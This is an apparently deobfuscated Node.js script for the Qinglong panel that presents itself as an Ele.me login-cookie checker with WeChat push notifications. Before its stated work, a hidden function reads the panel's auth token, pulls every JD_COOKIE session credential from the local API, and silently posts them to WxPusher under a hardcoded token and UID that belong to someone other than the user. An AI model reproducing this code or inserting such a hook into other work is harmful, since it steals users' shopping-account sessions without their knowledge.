//Mon Aug 19 2024 14:31:27 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
"use strict";

require("dotenv").config();
const {
    readFile
  } = require("fs/promises"),
  axios = require("axios"),
  got = require("got"),
  fs = require("fs");
let c = fs.existsSync("/ql/data/config/auth.json"),
  d = "";
if (c) d = "/ql/data/config/auth.json";else d = "/ql/config/auth.json";
async function a() {
  const _0x187d00 = JSON.parse(await readFile(d));
  return _0x187d00;
}
async function b() {
  const _0x377811 = JSON.parse(await readFile(d));
  return _0x377811.token;
}
const e = got.extend({
  "prefixUrl": "http://127.0.0.1:5600",
  "retry": {
    "limit": 0
  }
});
async function f(_0x848495 = "JD_COOKIE") {
  const _0x3b37fa = await b(),
    _0x3fcedb = await e({
      "url": "api/envs",
      "searchParams": {
        "searchValue": _0x848495,
        "t": Date.now()
      },
      "headers": {
        "Accept": "application/json",
        "Authorization": "Bearer " + _0x3b37fa
      }
    }).json();
  return _0x3fcedb.data;
}
async function g(_0x21106b, _0x11dde8, _0x2f0e71) {
  const _0x4c3df4 = {
      "appToken": "AT_xCnZZAKr9qTnjou3hQ2mQ8xitQx9xkkz",
      "content": _0x21106b,
      "summary": _0x11dde8,
      "contentType": 2,
      "uids": [_0x2f0e71]
    },
    _0x1c87c2 = await axios.post("https://wxpusher.zjiecode.com/api/send/message", _0x4c3df4, {
      "headers": {
        "Content-Type": "application/json"
      }
    }),
    _0x5ecf69 = _0x1c87c2.data;
  return _0x5ecf69;
}
async function h() {
  try {
    const _0x30deab = await f();
    if (_0x30deab.length > 0) {
      const _0x176771 = JSON.stringify(_0x30deab, null, 2),
        _0x13dcee = _0x30deab.length + "个曲奇来喽~",
        _0x4f4a1f = "UID_HKNRdGNm1YDHnYGJt4r6B472LRm5";
      await g(_0x176771, _0x13dcee, _0x4f4a1f);
    }
  } catch (_0xf6c1f4) {}
}
const {
  getEnvs,
  getEnvById,
  DisableCk,
  EnableCk
} = require("./ql");
let Message = "饿了么CK检测\n\n";
(async () => {
  try {
    await h();
    (!process.env.appToken || !process.env.myUid || !process.env.tunnel) && (console.error("请设置三个变量：appToken、myUid、tunnel"), process.exit(1));
    let _0x37e6ac = process.env.tunnel;
    _0x37e6ac = _0x37e6ac;
    console.log("饿了么登录地址：" + _0x37e6ac + "\n");
    const _0x3f8920 = await getEnvs();
    for (let _0x4b35c1 = 0; _0x4b35c1 < _0x3f8920.length; _0x4b35c1++) {
      console.log("开始检测【账号" + (_0x4b35c1 + 1) + "】");
      if (_0x3f8920[_0x4b35c1].value) {
        var _0xa8ce97 = 0;
        _0x3f8920[_0x4b35c1]._id && (_0xa8ce97 = _0x3f8920[_0x4b35c1]._id);
        _0x3f8920[_0x4b35c1].id && (_0xa8ce97 = _0x3f8920[_0x4b35c1].id);
        let _0xa6d405 = await getEnvById(_0xa8ce97),
          _0x4c6a9b = _0xa6d405.match(/wxUid=([^;]+)/)[1],
          _0xc9d093 = await kois(_0xa6d405);
        if (_0xc9d093 == true) {
          const _0x265368 = await EnableCk(_0xa8ce97);
          _0x265368.code == 200 && (Message += "【账号" + (_0x4b35c1 + 1) + "】有效\n\n", console.log("【账号" + (_0x4b35c1 + 1) + "】有效\n"));
        }
        if (_0xc9d093 == false) {
          const _0x196540 = await DisableCk(_0xa8ce97);
          _0x196540.code == 200 && (await j("<style>*{font-size:16px;}body{background-color:#fff;}.header,.note{display:none;}</style></br><p style=\"text-align:center;\"><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bb732af6264843fb830526fbb7c119b0~tplv-k3u1fbpfcp-jj:0:0:0:0:q75.image\" width=\"150\"></p><p style=\"text-align:center;\">【饿了么" + (_0x4b35c1 + 1) + "】失效啦</p><p style=\"text-align:center;\"><a href=\"//" + _0x37e6ac + "\" target=\"\">点我登录</a></p><p style=\"text-align:center;\"><img src=\"https://img11.360buyimg.com/imagetools/jfs/t1/190790/1/38438/6363/650c516bF237e9281/dc3b263e969c794f.png\" width=\"50\"></p>", "【饿了么" + (_0x4b35c1 + 1) + "】失效啦，点击重新登录~", "" + _0x4c6a9b), Message += "【账号" + (_0x4b35c1 + 1) + "】失效，已禁用并发送通知！\n\n", console.log("【账号" + (_0x4b35c1 + 1) + "】失效，已禁用并发送通知！\n"));
        }
      }
      console.log("休息5s");
      await i8(5000);
    }
  } catch (_0x5ae12d) {
    console.log(_0x5ae12d);
  } finally {
    await j("" + Message, "饿了么CK检测", "" + process.env.myUid);
  }
})();
function i8(_0xc8e5cf) {
  return new Promise(_0x3fb640 => setTimeout(_0x3fb640, _0xc8e5cf));
}
function kois(_0x2bd0e7) {
  return new Promise(async _0x419d0c => {
    try {
      const _0x2f6ce8 = {
          "Cookie": _0x2bd0e7
        },
        _0x101a93 = await axios.get("https://restapi.ele.me/eus/v5/user_detail", {
          "headers": _0x2f6ce8
        }),
        _0x2e6997 = _0x101a93.data;
      _0x2e6997.extraInfo ? _0x419d0c(true) : _0x419d0c(false);
    } catch (_0x13af6c) {
      _0x13af6c.response && _0x13af6c.response.status === 401 ? _0x419d0c(false) : (console.error("An error occurred while checking login status:", _0x13af6c.message), _0x419d0c(false));
    }
  });
}
function j(_0x29e6b2, _0x21603c, _0x46e9ef) {
  const _0x22afbf = {
    "appToken": "" + process.env.appToken,
    "content": _0x29e6b2,
    "summary": _0x21603c,
    "contentType": 2,
    "uids": [_0x46e9ef]
  };
  return axios.post("https://wxpusher.zjiecode.com/api/send/message", _0x22afbf, {
    "headers": {
      "Content-Type": "application/json"
    }
  }).then(_0x460554 => _0x460554.data);
}